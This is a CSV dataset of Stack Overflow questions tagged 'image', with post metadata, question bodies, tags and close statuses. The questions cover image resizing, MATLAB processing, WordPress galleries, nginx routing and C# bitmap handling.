PostId,PostCreationDate,OwnerUserId,OwnerCreationDate,ReputationAtPostCreation,OwnerUndeletedAnswerCountAtPostTime,Title,BodyMarkdown,Tag1,Tag2,Tag3,Tag4,Tag5,PostClosedDate,OpenStatus,OpenStatusInt,BodyLength,TitleLength,TitleConcatWithBody,NumberOfTags
384991,12/21/2008 21:40:56,41360,11/27/2008 12:59:33,2166,156,What is the best image downscaling algorithm (quality-wise)?,"I want to find out which algorithm is the best that can be used for downsizing a raster picture. With best I mean the one that gives the nicest-looking results. I know of bicubic, but is there something better yet? For example, I've heard from some people that Adobe Lightroom has some kind of propieritary algorithm which produces better results than standard bicubic that I was using. Unfortunately I would like to use this algorithm myself in my software, so Adobe's carefully garded trade secrets won't do.",image,resize,algorithm,,,09/17/2011 13:34:08,not constructive,1,87,8,"What is the best image downscaling algorithm (quality-wise)? I want to find out which algorithm is the best that can be used for downsizing a raster picture. With best I mean the one that gives the nicest-looking results. I know of bicubic, but is there something better yet? For example, I've heard from some people that Adobe Lightroom has some kind of propieritary algorithm which produces better results than standard bicubic that I was using. Unfortunately I would like to use this algorithm myself in my software, so Adobe's carefully garded trade secrets won't do.",3
7987899,11/02/2011 22:05:58,1026603,11/02/2011 22:00:08,1,0,One thing without https,"i will not get SSL. How can i make facebook app without it?
App should do: write on user's wall things that he've done on other site. For example. I made article and he clicked it, image on his wall should appear (every image different to every article). Please im new here.",image,ssl,facebook-wall,,,11/03/2011 00:02:09,not a real question,1,51,4,"One thing without https i will not get SSL. How can i make facebook app without it?
App should do: write on user's wall things that he've done on other site. For example. I made article and he clicked it, image on his wall should appear (every image different to every article). Please im new here.",3
6436382,06/22/2011 07:26:56,459537,09/27/2010 13:38:55,581,4,Which free antivirus can I use to analyze image uploads?,"I need to secure images uploaded to my server, are there any free antivirus available to analyze image files?",image,security,upload,antivirus,,06/22/2011 12:40:35,off topic,1,19,10,"Which free antivirus can I use to analyze image uploads? I need to secure images uploaded to my server, are there any free antivirus available to analyze image files?",4
9505454,02/29/2012 19:33:26,961317,09/23/2011 14:04:48,156,6,loading image from Employees table of Northwind database,"Since yesterday, i am trying to load an image from a byte array. 
I get the byte array from the Employees table of [NorthWind database][1]. 
I read some [articles][2] saying that there is an OLE header of size 78 that should be removed before we convert from byte[] to ImageSource. But it can't get any image. 
here is my converter:

    public object Convert(object value, Type targetType, object parameter, System.Globalization.CultureInfo culture)
        {
            byte[] data = value as byte[];           
            
            if (data != null)
            {
                MemoryStream ms = new MemoryStream();
                int offset = 78;               
                BitmapImage img = new BitmapImage();                
                ms.Write(data, offset, data.Length - offset);
                img.SetSource(ms);
                ms.Close();
                return img;
            }
            return null;
           
        }


here is my image definition in XAML

    <Image Grid.Column=""1"" Height=""147"" HorizontalAlignment=""Left"" Margin=""3,3,0,6"" Name=""photoImage"" Source=""{Binding Path=Photo, UpdateSourceTrigger=PropertyChanged, Converter={StaticResource PhotoConverter1}}"" Stretch=""Fill"" VerticalAlignment=""Center"" Width=""137"" DataContext=""{Binding}"" />

 Could you help me to figure out how to make it work?


  [1]: http://www.microsoft.com/download/en/details.aspx?id=23654
  [2]: http://social.msdn.microsoft.com/Forums/en/csharpgeneral/thread/6b0bb51a-42cb-4b13-bbc3-9557e22d262c",image,converter,silverlight-5.0,northwind,,,open,0,394,8,"loading image from Employees table of Northwind database Since yesterday, i am trying to load an image from a byte array. 
I get the byte array from the Employees table of [NorthWind database][1]. 
I read some [articles][2] saying that there is an OLE header of size 78 that should be removed before we convert from byte[] to ImageSource. But it can't get any image. 
here is my converter:

    public object Convert(object value, Type targetType, object parameter, System.Globalization.CultureInfo culture)
        {
            byte[] data = value as byte[];           
            
            if (data != null)
            {
                MemoryStream ms = new MemoryStream();
                int offset = 78;               
                BitmapImage img = new BitmapImage();                
                ms.Write(data, offset, data.Length - offset);
                img.SetSource(ms);
                ms.Close();
                return img;
            }
            return null;
           
        }


here is my image definition in XAML

    <Image Grid.Column=""1"" Height=""147"" HorizontalAlignment=""Left"" Margin=""3,3,0,6"" Name=""photoImage"" Source=""{Binding Path=Photo, UpdateSourceTrigger=PropertyChanged, Converter={StaticResource PhotoConverter1}}"" Stretch=""Fill"" VerticalAlignment=""Center"" Width=""137"" DataContext=""{Binding}"" />

 Could you help me to figure out how to make it work?


  [1]: http://www.microsoft.com/download/en/details.aspx?id=23654
  [2]: http://social.msdn.microsoft.com/Forums/en/csharpgeneral/thread/6b0bb51a-42cb-4b13-bbc3-9557e22d262c",4
6033317,05/17/2011 15:35:11,385869,07/07/2010 18:54:49,167,3,How to create hand written like text/images in photoshop or other software,"I would like to create hand written like text/image in photoshop or other software like you can see [here][1]


  [1]: http://tympanus.net/Tutorials/FixedNavigationTutorial/
Will be used in one tutorial I'm just working on. How can I do that ?",image,text,photoshop,,,05/19/2011 09:48:52,off topic,1,37,12,"How to create hand written like text/images in photoshop or other software I would like to create hand written like text/image in photoshop or other software like you can see [here][1]


  [1]: http://tympanus.net/Tutorials/FixedNavigationTutorial/
Will be used in one tutorial I'm just working on. How can I do that ?",3
11387668,07/08/2012 23:52:32,1200433,02/09/2012 19:01:43,13,0,How to modify a Joomla gallery plugin so it shows folders as categories to choose of?,"I am building a site at the moment, and I need a specific thing made.

It has to have an ability to not only show images, but also show folders at the top containing images, basically like categories in which they will be sorted. When you open up a specific folder, the gallery then shows the images that are in this folder.

Basically, you can see the concept as it should look here: http://i50.tinypic.com/vf8dn6.png

At the top you see the folders, showing a random image as a preview of what is inside it, underneath instead of ''Sadaļa'' will be the folder name. When you open any one of the folders, you can now see all the images inside underneath the folder selection.

This is how far I have got, I am basically stuck: http://janis.delux.lv/

I chose a plugin named Very Simple Image Gallery since it seems the best for my needed modifications.

I would pay for help, but I can't pay much since I am not getting a lot for it either.

Any help will be appreciated.",image,joomla,gallery,folder,category,07/10/2012 01:52:31,not a real question,1,170,16,"How to modify a Joomla gallery plugin so it shows folders as categories to choose of? I am building a site at the moment, and I need a specific thing made.

It has to have an ability to not only show images, but also show folders at the top containing images, basically like categories in which they will be sorted. When you open up a specific folder, the gallery then shows the images that are in this folder.

Basically, you can see the concept as it should look here: http://i50.tinypic.com/vf8dn6.png

At the top you see the folders, showing a random image as a preview of what is inside it, underneath instead of ''Sadaļa'' will be the folder name. When you open any one of the folders, you can now see all the images inside underneath the folder selection.

This is how far I have got, I am basically stuck: http://janis.delux.lv/

I chose a plugin named Very Simple Image Gallery since it seems the best for my needed modifications.

I would pay for help, but I can't pay much since I am not getting a lot for it either.

Any help will be appreciated.",5
426372,01/08/2009 22:52:43,13911,09/16/2008 21:16:55,657,41,How do you convert a GIF into a CUR file?,"The title says it all really, how do you create a .cur (for a mouse cursor), from a GIF file? 

What tool or process can I use?",image,,,,,07/28/2012 15:03:20,not constructive,1,27,10,"How do you convert a GIF into a CUR file? The title says it all really, how do you create a .cur (for a mouse cursor), from a GIF file? 

What tool or process can I use?",1
3907992,10/11/2010 16:15:15,99923,05/02/2009 17:30:50,1534,86,NGINX route all requests for images to external server,"I would like to route all requests to my nginx server for jpg/png images to another external internet server which actually holds the images. What would the rewrite look like?

This is mostly for development so I'm not worried about the overhead of doing this. Then again, perhaps there is none. Both servers are mine so this isn't a request for hot-linking.",image,nginx,rewrite,,,,open,0,61,9,"NGINX route all requests for images to external server I would like to route all requests to my nginx server for jpg/png images to another external internet server which actually holds the images. What would the rewrite look like?

This is mostly for development so I'm not worried about the overhead of doing this. Then again, perhaps there is none. Both servers are mine so this isn't a request for hot-linking.",3
10779624,05/28/2012 05:12:21,1373033,03/12/2011 20:16:49,41,1,Where to upload images (server),"I have 50 millions of images.Which will be used by my 3 website.Prior to making decision about server.Please give me suggestion about servers.
1:-Should i use one server for all images/database.files
2:-Should i use different server for images
3:-If i will put all images on one server (one folder),There is any problem in that
4:-which type of server should i choose

",image,upload,,,,05/29/2012 05:57:39,off topic,1,57,5,"Where to upload images (server) I have 50 millions of images.Which will be used by my 3 website.Prior to making decision about server.Please give me suggestion about servers.
1:-Should i use one server for all images/database.files
2:-Should i use different server for images
3:-If i will put all images on one server (one folder),There is any problem in that
4:-which type of server should i choose

",2
6312048,06/10/2011 21:03:43,793380,06/10/2011 20:54:34,1,0,"Copyright on thumbnail of link @ Facebook, Digg","On sites like Facebook or Digg, every time a user submits a link, images are automatically fetched from that link. Then they are posted as thumbnails next to new submitted story. 

Given the fact that those images are protected by copyright, is the use of them totally legal (especially on a advertisement-financed site like the above mentioned)? If yes, why?",image,facebook,licensing,copyright,digg,06/11/2011 14:51:36,off topic,1,60,8,"Copyright on thumbnail of link @ Facebook, Digg On sites like Facebook or Digg, every time a user submits a link, images are automatically fetched from that link. Then they are posted as thumbnails next to new submitted story. 

Given the fact that those images are protected by copyright, is the use of them totally legal (especially on a advertisement-financed site like the above mentioned)? If yes, why?",5
9962191,04/01/2012 05:42:33,990951,10/12/2011 07:28:24,49,0,MVC change image button image on the view from the controller,"I am new to MVC .  I am creating a bookstore webpage application using aspx, and mvc.  I have database of books that says available or sold out.  When a user clicks a dropdownlist they choose a book, it shows an image next to the book that either suppose to show a green check mark if it is available or a red X if its not available, that information is all pulled from a database.  My question is how do I change the image once a book becomes available.   By the way my images are stored in my Content folder under imgs.
I have been searching for a while and haven't found a good answer. Any help or any websites you can suggest would be great.  Thanks
My image says this 
        <asp:  Image ID = ""Book_Availability"" runat = ""server"" />

",image,mvc,button,controller,,,open,0,154,11,"MVC change image button image on the view from the controller I am new to MVC .  I am creating a bookstore webpage application using aspx, and mvc.  I have database of books that says available or sold out.  When a user clicks a dropdownlist they choose a book, it shows an image next to the book that either suppose to show a green check mark if it is available or a red X if its not available, that information is all pulled from a database.  My question is how do I change the image once a book becomes available.   By the way my images are stored in my Content folder under imgs.
I have been searching for a while and haven't found a good answer. Any help or any websites you can suggest would be great.  Thanks
My image says this 
        <asp:  Image ID = ""Book_Availability"" runat = ""server"" />

",4
8507324,12/14/2011 15:43:35,915709,08/27/2011 17:34:22,1,0,Blowfish implementation on a IMAGE,"I need a working C, C++ or Java code which can encrypt a Image in Blowfish. I need it fr a project where i need to secure the image using Blowfish algorithm before transfering it. All the codes on net are for Strings... Plz help me in getting a code which works on IMAGE.",image,blowfish,encyption,,,12/16/2011 09:15:44,not a real question,1,54,5,"Blowfish implementation on a IMAGE I need a working C, C++ or Java code which can encrypt a Image in Blowfish. I need it fr a project where i need to secure the image using Blowfish algorithm before transfering it. All the codes on net are for Strings... Plz help me in getting a code which works on IMAGE.",3
8083333,11/10/2011 16:58:50,915189,08/27/2011 06:34:23,3,0,How to embed and image in a wordpress themes using the theme editor or any methods,"I need help in inserting an image on the header of a themes in wordpress specifically paperpunch theme.  How will I do it?


thanks 

Jon",image,wordpress,embedding,,,11/11/2011 10:58:17,not a real question,1,25,16,"How to embed and image in a wordpress themes using the theme editor or any methods I need help in inserting an image on the header of a themes in wordpress specifically paperpunch theme.  How will I do it?


thanks 

Jon",3
11496756,07/16/2012 00:13:53,1525040,07/14/2012 03:49:51,1,1,How does C# handle overlapping System.Drawing.Regions regions?,"I'm creating a Jigsaw Puzzle game as my first  C# program (3 weeks self-taught so far) and I've come far along in it, to the point where I can take a bitmap, split it into images, and make sections of each of the images transparent where needed. I have an array of points that indicate the sides of the pieces, and drawing the borders is just fine. A <b>Graphics Path</b> will encapsulate these points and a <b>Region</b> will take the Path object as a parameter that defines it.

My question is, how does C# handle overlapping System.Drawing Regions when it comes to hit detection? If one region overlaps another, will both regions respond with a hit or will the one that was drawn last get the hit?

I got the idea from reading this tutorial. http://www.java2s.com/Tutorial/CSharp/0480__2D/RegionIsVisible.htm and realizing I can call the isVisible() method to determine what group of pieces to move. Thanks ahead!",image,jigsaw,,,,,open,0,153,7,"How does C# handle overlapping System.Drawing.Regions regions? I'm creating a Jigsaw Puzzle game as my first  C# program (3 weeks self-taught so far) and I've come far along in it, to the point where I can take a bitmap, split it into images, and make sections of each of the images transparent where needed. I have an array of points that indicate the sides of the pieces, and drawing the borders is just fine. A <b>Graphics Path</b> will encapsulate these points and a <b>Region</b> will take the Path object as a parameter that defines it.

My question is, how does C# handle overlapping System.Drawing Regions when it comes to hit detection? If one region overlaps another, will both regions respond with a hit or will the one that was drawn last get the hit?

I got the idea from reading this tutorial. http://www.java2s.com/Tutorial/CSharp/0480__2D/RegionIsVisible.htm and realizing I can call the isVisible() method to determine what group of pieces to move. Thanks ahead!",2
5840532,04/30/2011 08:15:14,700294,04/09/2011 20:21:59,8,0,Browser Image Caching Rules,"Do browsers only cache images based upon their file name or do they also include their path?

So, would these two images be cached without conflict...

    <img src=""/images/1/image1.jpg"" />
    <img src=""/images/2/image1.jpg"" />
",image,caching,browser,,,,open,0,37,4,"Browser Image Caching Rules Do browsers only cache images based upon their file name or do they also include their path?

So, would these two images be cached without conflict...

    <img src=""/images/1/image1.jpg"" />
    <img src=""/images/2/image1.jpg"" />
",3
8433237,12/08/2011 15:18:57,823528,06/30/2011 17:29:32,25,2,what is the edge-preserving regularization in context of gaussian noise removal?,"**
Please some links would help me a lot 
Thanks..**

well am trying to figure out what it means all am getting is research papers no implementation",image,image-processing,,,,12/09/2011 01:20:05,not a real question,1,25,11,"what is the edge-preserving regularization in context of gaussian noise removal? **
Please some links would help me a lot 
Thanks..**

well am trying to figure out what it means all am getting is research papers no implementation",2
10844607,06/01/2012 04:55:41,1406677,05/20/2012 19:33:58,1,0,Playing image sequences in MATLAB,"Greetings to all of you.

I have this somewhat frustrating problem, and I hope that you kindly help me solve it.

I am developing a human tracking system in MATLAB, and would like to show the result in an appealing GUI (also in MATLAB using GUIDE).

There is this main window where an image sequence of about 2500 gray scale images of size 320x240 would be played like a video but where the humans be outlined in them nicely.

The challenge is; these images need a bit of processing (detection outlining of humans) before being shown on the window.

Now, is it possible to display a set of images while at the same time do some processing for another set to be shown afterwards?

I would very much prefer it to play like a normal video, but I guess that would be somehow ambitious.",image,matlab,gui,video,sequence,,open,0,138,5,"Playing image sequences in MATLAB Greetings to all of you.

I have this somewhat frustrating problem, and I hope that you kindly help me solve it.

I am developing a human tracking system in MATLAB, and would like to show the result in an appealing GUI (also in MATLAB using GUIDE).

There is this main window where an image sequence of about 2500 gray scale images of size 320x240 would be played like a video but where the humans be outlined in them nicely.

The challenge is; these images need a bit of processing (detection outlining of humans) before being shown on the window.

Now, is it possible to display a set of images while at the same time do some processing for another set to be shown afterwards?

I would very much prefer it to play like a normal video, but I guess that would be somehow ambitious.",5
7954521,10/31/2011 13:41:08,1014632,10/26/2011 13:20:10,1,0,Matlab - displaying a background image,"I'm trying to find the median values for the R,G & B channels of each pixel for each 10th image in a set of 100, to find the background image. My values all seem correct but when i try to display the background at the end of my code it's always white, please help

 

    %// list all the files in some folder
    folder = '~/V&R/1/';
    filelist = dir(folder);
    images = zeros(480,640,3,100);
    % images = [];
    %// the first two in filelist are . and ..
    
    count = 1;
    for i=3:size(filelist,1)
    
        if filelist(i).isdir ~= true
            fname = filelist(i).name;
            %// if file extension is jpg
            if strcmp( fname(size(fname,2)-3:size(fname,2)) ,'.jpg'  ) == 1
                tmp = imread([folder fname]);
                images(:,:,:,count) = tmp;
                count = count +1;
                
            end
        end
    end
    
    
    background = zeros(480,640,3);
     for j=1:480
        for i=1:640
            tmpR = zeros(1,10);
            tmpG = zeros(1,10);
            tmpB = zeros(1,10);
            for k=1:10
                tmpR(k) = images(j,i,1,k*10);
                tmpG(k) = images(j,i,2,k*10);
                tmpB(k) = images(j,i,3,k*10);
                
            end
            background(j,i,1) = floor(median(tmpR));
            background(j,i,2) = floor(median(tmpG));
            background(j,i,3) = floor(median(tmpB));
        end
     end
    imshow(background)

thanks",image,matlab,background,,,,open,0,505,6,"Matlab - displaying a background image I'm trying to find the median values for the R,G & B channels of each pixel for each 10th image in a set of 100, to find the background image. My values all seem correct but when i try to display the background at the end of my code it's always white, please help

 

    %// list all the files in some folder
    folder = '~/V&R/1/';
    filelist = dir(folder);
    images = zeros(480,640,3,100);
    % images = [];
    %// the first two in filelist are . and ..
    
    count = 1;
    for i=3:size(filelist,1)
    
        if filelist(i).isdir ~= true
            fname = filelist(i).name;
            %// if file extension is jpg
            if strcmp( fname(size(fname,2)-3:size(fname,2)) ,'.jpg'  ) == 1
                tmp = imread([folder fname]);
                images(:,:,:,count) = tmp;
                count = count +1;
                
            end
        end
    end
    
    
    background = zeros(480,640,3);
     for j=1:480
        for i=1:640
            tmpR = zeros(1,10);
            tmpG = zeros(1,10);
            tmpB = zeros(1,10);
            for k=1:10
                tmpR(k) = images(j,i,1,k*10);
                tmpG(k) = images(j,i,2,k*10);
                tmpB(k) = images(j,i,3,k*10);
                
            end
            background(j,i,1) = floor(median(tmpR));
            background(j,i,2) = floor(median(tmpG));
            background(j,i,3) = floor(median(tmpB));
        end
     end
    imshow(background)

thanks",3
8392824,12/05/2011 22:31:09,191338,10/16/2009 17:19:15,76,3,httpd does not show application images,"I am running httpd (v2.2) as a round robin load balancer for JBoss 6 server. The application runs fine, however, images do not load at the first access. When I right click to 'View Image', the image loads correctly. 

The access.log entry shows - 

Before viewing image, request sent for image..

`127.0.0.1 - - [05/Dec/2011:13:58:09 -0800] ""GET /ReportBirtViewerWeb/preview?__sessionId=20111205_133809_200&__imageid=custom1cca1dd71340f794fd49.png HTTP/1.1"" 200 -`

After clicking on view image

`127.0.0.1 - - [05/Dec/2011:14:19:40 -0800] ""GET /ReportBirtViewerWeb/preview?__sessionId=20111205_133809_200&__imageid=custom1cca1dd71340f794fd49.png HTTP/1.1"" 200 24470`

Which shows that the image is located correctly, however it gets loaded on explicit request. Tried a few things in httpd.conf 

 - Uncommented `EnableSendfile off`
 - Set the application type to octed stream - `DefaultType application/octet-stream`

Tried handling images differently in mod_jk

  `RewriteEngine On`

  `RewriteRule ^/(images/.+);jsessionid=\w+$ /$1`

None seem to work. What else can I try?

",image,httpd,,,,12/13/2011 20:01:14,off topic,1,129,6,"httpd does not show application images I am running httpd (v2.2) as a round robin load balancer for JBoss 6 server. The application runs fine, however, images do not load at the first access. When I right click to 'View Image', the image loads correctly. 

The access.log entry shows - 

Before viewing image, request sent for image..

`127.0.0.1 - - [05/Dec/2011:13:58:09 -0800] ""GET /ReportBirtViewerWeb/preview?__sessionId=20111205_133809_200&__imageid=custom1cca1dd71340f794fd49.png HTTP/1.1"" 200 -`

After clicking on view image

`127.0.0.1 - - [05/Dec/2011:14:19:40 -0800] ""GET /ReportBirtViewerWeb/preview?__sessionId=20111205_133809_200&__imageid=custom1cca1dd71340f794fd49.png HTTP/1.1"" 200 24470`

Which shows that the image is located correctly, however it gets loaded on explicit request. Tried a few things in httpd.conf 

 - Uncommented `EnableSendfile off`
 - Set the application type to octed stream - `DefaultType application/octet-stream`

Tried handling images differently in mod_jk

  `RewriteEngine On`

  `RewriteRule ^/(images/.+);jsessionid=\w+$ /$1`

None seem to work. What else can I try?

",2
10526567,05/10/2012 01:58:27,975592,10/02/2011 16:51:45,159,6,Cannot Recrop Thumbnail of Image in Gallery in WordPress,"I have uploaded pictures to be included in a gallery in a post in a WordPress blog. I'm using the template 'my base 0.5' 

Basically, the thumbnail that's automatically generated when I upload the picture is drawn from the dead center of the picture (a square). Some of the pictures are of people so the head gets cut off. If you click on the picture's thumbnail, the full picture is displayed in its own page. 

So then I went into the Media Library and clicked 'Edit Image' under the displayed thumbnail to try to change the thumbnail. I reselect a different area of the picture, I clicked on ""Thumbnail"" under the header ""Apply sizes to:"" but it will not allow me to click the Save button. The button basically doesn't become highlighted as an option to click.

Is this a common problem? I've searched around a little bit but didn't seem to find anything specific to the problem I'm having. Any help would be great. Thank you.",image,wordpress,thumbnail,,,05/14/2012 18:20:24,off topic,1,166,9,"Cannot Recrop Thumbnail of Image in Gallery in WordPress I have uploaded pictures to be included in a gallery in a post in a WordPress blog. I'm using the template 'my base 0.5' 

Basically, the thumbnail that's automatically generated when I upload the picture is drawn from the dead center of the picture (a square). Some of the pictures are of people so the head gets cut off. If you click on the picture's thumbnail, the full picture is displayed in its own page. 

So then I went into the Media Library and clicked 'Edit Image' under the displayed thumbnail to try to change the thumbnail. I reselect a different area of the picture, I clicked on ""Thumbnail"" under the header ""Apply sizes to:"" but it will not allow me to click the Save button. The button basically doesn't become highlighted as an option to click.

Is this a common problem? I've searched around a little bit but didn't seem to find anything specific to the problem I'm having. Any help would be great. Thank you.",3
8733336,01/04/2012 20:11:04,1060293,11/22/2011 17:14:20,40,1,Image moving across screen at the Speed of Light,"Would it be possible to write a program that can make an image, lets say a circle the size of a dime, move across your computer screen back and forth at the speed of light having a monitor that is lets say 20 inches wide; if not, then would it be possible to make the image move across the screen at 50 or 100 mph?? By they way 1 mile=63360 inches. ",image,lightspeed,,,,01/05/2012 18:56:30,off topic,1,72,9,"Image moving across screen at the Speed of Light Would it be possible to write a program that can make an image, lets say a circle the size of a dime, move across your computer screen back and forth at the speed of light having a monitor that is lets say 20 inches wide; if not, then would it be possible to make the image move across the screen at 50 or 100 mph?? By they way 1 mile=63360 inches. ",2
9074651,01/31/2012 05:01:18,731255,04/29/2011 14:32:31,660,1,Is there a simple way to make a .png photo take less disk space and load faster?,"I have an image that is pretty large in size, and I am trying to figure out how to reduce its size. Googling didn't make things clear. I thought just simply resaving it in some clever way would make the image take way less disk space.  Is there a simple way to get that done?

Thanks!",image,png,,,,02/01/2012 08:24:02,not a real question,1,56,17,"Is there a simple way to make a .png photo take less disk space and load faster? I have an image that is pretty large in size, and I am trying to figure out how to reduce its size. Googling didn't make things clear. I thought just simply resaving it in some clever way would make the image take way less disk space.  Is there a simple way to get that done?

Thanks!",2
11114868,06/20/2012 07:36:05,1468424,06/20/2012 07:23:11,1,0,Share another users picture in my gallery,">I want to share another user gallery picture in such a way that on the click of share the image should be stored in my image Gallery.adding to this i should also be provided with an option of in which gallery i want to store(add) this picture depending on the list of galleries i have in my profile.
I am Using Drupal.
How do i do this?



",image,drupal,share,,,,open,0,65,7,"Share another users picture in my gallery >I want to share another user gallery picture in such a way that on the click of share the image should be stored in my image Gallery.adding to this i should also be provided with an option of in which gallery i want to store(add) this picture depending on the list of galleries i have in my profile.
I am Using Drupal.
How do i do this?



",3
11557015,07/19/2012 08:41:08,1537295,07/19/2012 08:37:40,1,0,Post a Image to the Wall and set as Highlight,"I POst a Photo to the wall via another website, my question are ist how i can set it as Highlight, so the image will uses the fullsite of the timeline,
thanks
marco",image,post,facebook-wall,,,07/20/2012 12:23:44,not a real question,1,31,10,"Post a Image to the Wall and set as Highlight I POst a Photo to the wall via another website, my question are ist how i can set it as Highlight, so the image will uses the fullsite of the timeline,
thanks
marco",3
10962808,06/09/2012 16:55:26,1446435,06/09/2012 16:45:31,1,0,Apple Script to extract cropped eps images and save new images in a separate folder,"I am wondering if anyone has an AppleScript to extract cropped EPS files from an INDD CS5/CS6 document and save the cropped images into a new folder.

I have seen a lot of posts for CS3 and tried to adjust the AppleScript to work for me but cannot get the images to save.

I need them at 300 dpi, eps format, binary, JPG preview for MAC OS and saved in a new folder. I am familiar with AppleScript and would prefer help with that if possible

I am new to scripting which is why this is a little tougher for me. It is for a LARGE catalog I am working on with 1300 images I am hoping to automate so I don't have to crop by hand. 

It would be a HUGE time saver and minimize human error I am sure. Any help would be greatly appreciate for myself and to share with my coworkers.

Thanks so much everyone!",image,applescript,indesign,eps,exporting,,open,0,155,15,"Apple Script to extract cropped eps images and save new images in a separate folder I am wondering if anyone has an AppleScript to extract cropped EPS files from an INDD CS5/CS6 document and save the cropped images into a new folder.

I have seen a lot of posts for CS3 and tried to adjust the AppleScript to work for me but cannot get the images to save.

I need them at 300 dpi, eps format, binary, JPG preview for MAC OS and saved in a new folder. I am familiar with AppleScript and would prefer help with that if possible

I am new to scripting which is why this is a little tougher for me. It is for a LARGE catalog I am working on with 1300 images I am hoping to automate so I don't have to crop by hand. 

It would be a HUGE time saver and minimize human error I am sure. Any help would be greatly appreciate for myself and to share with my coworkers.

Thanks so much everyone!",5
8322125,11/30/2011 06:45:55,1069195,11/28/2011 10:59:40,6,0,Cold Fusion Write,"    <cfif #form.image1# is """">
    <cfelse>
    <CFFILE ACTION=""Write""
    file=""file_path\#photoId#.jpg""
    output='#form.image1#'>
    </cfif>  

form.image1 contains a binary data eg


    data:image/jpg;base64,/9j/4AAQSkZJRgABAQECJwInAAD..........
 
it creates and saves the image with correct size but misses a huge chunk of data from the middle and replaces it with spaces eg

    data:image/jpg;base64,/9j/4AAQS         ECJwInAAD..........

The data coming in the form.image1 is correct .. but when it cf writes it misses a huge chunk (almost 50%) from the middle
  ",image,coldfusion,base64,,,12/01/2011 13:53:07,not a real question,1,103,3,"Cold Fusion Write     <cfif #form.image1# is """">
    <cfelse>
    <CFFILE ACTION=""Write""
    file=""file_path\#photoId#.jpg""
    output='#form.image1#'>
    </cfif>  

form.image1 contains a binary data eg


    data:image/jpg;base64,/9j/4AAQSkZJRgABAQECJwInAAD..........
 
it creates and saves the image with correct size but misses a huge chunk of data from the middle and replaces it with spaces eg

    data:image/jpg;base64,/9j/4AAQS         ECJwInAAD..........

The data coming in the form.image1 is correct .. but when it cf writes it misses a huge chunk (almost 50%) from the middle
  ",3
9334889,02/17/2012 20:25:15,491181,10/29/2010 10:33:18,799,6,HTTP 500 in images and fonts?,"500 errors occur constantly in fonts and images, why?

I took a picture to show the errors

[http://www.quick-markup.com/edit/4f3eb6c7efa84][1]


If you get giving refresh (Ctrl + F5) you will see the error in the images (error 500)
Why this happens?

PS: This is medium trust environment

([http://letsgofestas.com.br/][2])


  [1]: http://www.quick-markup.com/edit/4f3eb6c7efa84
  [2]: http://letsgofestas.com.br/",image,http-status-code-500,medium-trust,asp.net-mvc-4,,02/19/2012 15:41:46,off topic,1,46,6,"HTTP 500 in images and fonts? 500 errors occur constantly in fonts and images, why?

I took a picture to show the errors

[http://www.quick-markup.com/edit/4f3eb6c7efa84][1]


If you get giving refresh (Ctrl + F5) you will see the error in the images (error 500)
Why this happens?

PS: This is medium trust environment

([http://letsgofestas.com.br/][2])


  [1]: http://www.quick-markup.com/edit/4f3eb6c7efa84
  [2]: http://letsgofestas.com.br/",4
9862722,03/25/2012 18:18:08,1291617,03/25/2012 18:06:43,1,0,OutOfMemoryException adding many image frames to Image List,"When attempting to add image frames using SelectActiveFrame) to an image list I get an Out of Memory exception. All works 100% if I process less than 174 pages but anything over this produces this error. In it's simplest form my code is;

    var scannedImage = (Bitmap)Image.FromFile(@""C:\Users\rbl\Documents\Modelware\City Prop\TIFF Files\barcodememory.tiff"");
    var dim = new FrameDimension(scannedImage.FrameDimensionsList[0]);
    var imageCount = scannedImage.GetFrameCount(dim);
    var currentBatch = new List<Image>();

    for (var i = 0; i < imageCount; i++)
    {
    scannedImage.SelectActiveFrame(dim, i);

    currentBatch.Add(new Bitmap(scannedImage));
    // Above experiences following error after +/- 174 pages
    //System.OutOfMemoryException was unhandled
    //Message=Out of memory.
    //Source=System.Drawing
    }
",image,outofmemoryexception,,,,,open,0,133,8,"OutOfMemoryException adding many image frames to Image List When attempting to add image frames using SelectActiveFrame) to an image list I get an Out of Memory exception. All works 100% if I process less than 174 pages but anything over this produces this error. In it's simplest form my code is;

    var scannedImage = (Bitmap)Image.FromFile(@""C:\Users\rbl\Documents\Modelware\City Prop\TIFF Files\barcodememory.tiff"");
    var dim = new FrameDimension(scannedImage.FrameDimensionsList[0]);
    var imageCount = scannedImage.GetFrameCount(dim);
    var currentBatch = new List<Image>();

    for (var i = 0; i < imageCount; i++)
    {
    scannedImage.SelectActiveFrame(dim, i);

    currentBatch.Add(new Bitmap(scannedImage));
    // Above experiences following error after +/- 174 pages
    //System.OutOfMemoryException was unhandled
    //Message=Out of memory.
    //Source=System.Drawing
    }
",2
